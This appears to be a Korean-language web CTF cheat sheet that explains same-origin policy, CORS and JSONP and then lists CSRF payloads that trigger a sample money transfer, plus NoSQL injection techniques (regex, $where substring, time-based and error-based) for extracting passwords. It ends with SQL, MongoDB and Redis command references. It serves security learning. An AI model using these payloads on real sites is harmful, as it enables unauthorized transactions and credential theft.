# 🕸️ WEB CTF TIPS

# Catalog
- [🕸️ WEB CTF TIPS](#️-web-ctf-tips)
- [Catalog](#catalog)
  - [Mitigation](#mitigation)
    - [Same Origin Policy (SOP)](#same-origin-policy-sop)
    - [Cross Origin Resource Sharing (CORS)](#cross-origin-resource-sharing-cors)
    - [JSON with Padding (JSONP)](#json-with-padding-jsonp)

## Mitigation

### Same Origin Policy (SOP)
- SOP는 Cross Origin이 아닌 Same Origin일 때만 정보를 읽을 수 있도록 해줍니다.

```javascript
<!-- iframe 객체 생성 -->
<iframe src="" id="my-frame"></iframe>
<!-- Javascript 시작 -->
<script>
/* 2번째 줄의 iframe 객체를 myFrame 변수에 가져옵니다. */
let myFrame = document.getElementById('my-frame')
/* iframe 객체에 주소가 로드되는 경우 아래와 같은 코드를 실행합니다. */
myFrame.onload = () => {
    /* try ... catch 는 에러를 처리하는 로직 입니다. */
    try {
        /* 로드가 완료되면, secret-element 객체의 내용을 콘솔에 출력합니다. */
        let secretValue = myFrame.contentWindow.document.getElementById('secret-element').innerText;
        console.log({ secretValue });
    } catch(error) {
        /* 오류 발생시 콘솔에 오류 로그를 출력합니다. */
        console.log({ error });
    }
}
/* iframe객체에 Same Origin, Cross Origin 주소를 로드하는 함수 입니다. */
const loadSameOrigin = () => { myFrame.src = 'https://same-origin.com/frame.html'; }
const loadCrossOrigin = () => { myFrame.src = 'https://cross-origin.com/frame.html'; }
</script>
<!--
버튼 2개 생성 (Same Origin 버튼, Cross Origin 버튼)
-->
<button onclick=loadSameOrigin()>Same Origin</button><br>
<button onclick=loadCrossOrigin()>Cross Origin</button>
<!--
frame.html의 코드가 아래와 같습니다.
secret-element라는 id를 가진 div 객체 안에 treasure라고 하는 비밀 값을 넣어두었습니다.
-->
<div id="secret-element">treasure</div>
```

### Cross Origin Resource Sharing (CORS)
- 이미지나 자바스크립트, CSS 등의 리소스를 불러오는 `<img>`, `<style>`, `<script>` 등의 태그는 SOP의 영향을 받지 않습니다.
- 교차 출처의 자원을 공유하는 방법은 CORS와 관련된 HTTP 헤더를 추가하여 전송하는 방법을 사용합니다. 이 외에도 JSON with Padding (JSONP) 방법을 통해 CORS를 대체할 수 있습니다.

```javascript
/*
    XMLHttpRequest 객체를 생성합니다. 
    XMLHttpRequest는 웹 브라우저와 웹 서버 간에 데이터 전송을
    도와주는 객체 입니다. 이를 통해 HTTP 요청을 보낼 수 있습니다.
*/
xhr = new XMLHttpRequest();
/* https://theori.io/whoami 페이지에 POST 요청을 보내도록 합니다. */
xhr.open('POST', 'https://theori.io/whoami');
/* HTTP 요청을 보낼 때, 쿠키 정보도 함께 사용하도록 해줍니다. */
xhr.withCredentials = true;
/* HTTP Body를 JSON 형태로 보낼 것이라고 수신측에 알려줍니다. */
xhr.setRequestHeader('Content-Type', 'application/json');
/* xhr 객체를 통해 HTTP 요청을 실행합니다. */
xhr.send("{'data':'WhoAmI'}");
```
- 표를 살펴보면, 발신측에서 POST 방식으로 HTTP 요청을 보냈으나, OPTIONS 메소드를 가진 HTTP 요청이 전달된 것을 확인할 수 있습니다. 이를 `CORS preflight`라고 하며, 수신측에 웹 리소스를 요청해도 되는지 질의하는 과정입니다.

### JSON with Padding (JSONP)
```javascript
<script>
/* myCallback이라는 콜백 함수를 지정합니다. */
function myCallback(data){
    /* 전달받은 인자에서 id를 콘솔에 출력합니다.*/
	console.log(data.id)
}
</script>
<!--
https://theori.io의 스크립트를 로드하는 HTML 코드입니다.
단, callback이라는 이름의 파라미터를 myCallback으로 지정함으로써
수신측에게 myCallback 함수를 사용해 수신받겠다고 알립니다.
-->
<script src='http://theori.io/whoami?callback=myCallback'></script>
```

## Vulnerability

### CSRF
- html
```html
<img src='http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337' width=0px height=0px>
<img src="/sendmoney?to=dreamhack&amount=1337">
<img src=1 onerror="fetch('/sendmoney?to=dreamhack&amount=1337');">
<link rel="stylesheet" href="/sendmoney?to=dreamhack&amount=1337">
```
- javascript
```javascript
/* 새 창 띄우기 */
window.open('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
/* 현재 창 주소 옮기기 */
location.href = 'http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337';
location.replace('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
```

### NoSQL Injection
- $regex
```js
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})
...
> db.user.find({upw: {$regex: "^g"}})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

- $where
```js
> db.user.find({$where:"return 1==1"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
> db.user.find({uid:{$where:"return 1==1"}})
error: {
	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
	"code" : 17287
}
```

- $where && substring
```js
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
...
> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

- Time Based
```js
db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
/*
/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
...
/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
=> 시간 지연 발생.
*/
```

- Error Based
```js
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
	"code" : 16722
}
// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
```

## Database
### SQL & MongoDB(NoSQL)
- SELECT
```sql
SELECT * FROM account;
db.account.find()
SELECT * FROM account WHERE user_id="admin";
db.account.find(
{user_id: "admin"}
)
SELECT user_idx FROM account WHERE user_id="admin";
db.account.find(
{ user_id: "admin" },
{ user_idx:1, _id:0 }
)
```

- INSERT
```sql
INSERT INTO account(
user_id,
user_pw,
) VALUES ("guest", "guest");
db.account.insert({
user_id: "guest",
user_pw: "guest"
})
```

- DELETE
```sql
DELETE FROM account;
db.account.remove()
DELETE FROM account WHERE user_id="guest";
db.account.remove( {user_id: "guest"} )
```

- UPDATE
```sql
UPDATE account SET user_id="guest2" WHERE user_idx=2;
db.account.update(
{user_idx: 2},
{ $set: { user_id: "guest2" } }
)
```

### Redis
```cmd
$ redis-cli
127.0.0.1:6379> SET test 1234 # SET key value
OK
127.0.0.1:6379> GET test # GET key
"1234"
```

```js
GET key
데이터 조회
MGET key [key ...]
여러 데이터를 조회
SET key value
새로운 데이터 추가
MSET key value [key value ...]
여러 데이터를 추가
DEL key [key ...]
데이터 삭제
EXISTS key [key ...]
데이터 유무 확인
INCR key
데이터 값에 1 더함
DECR key
데이터 값에 1 뺌
```
```js
INFO [section]
DBMS 정보 조회
CONFIG GET parameter
설정 조회
CONFIG SET parameter value
새로운 설정을 입력
```

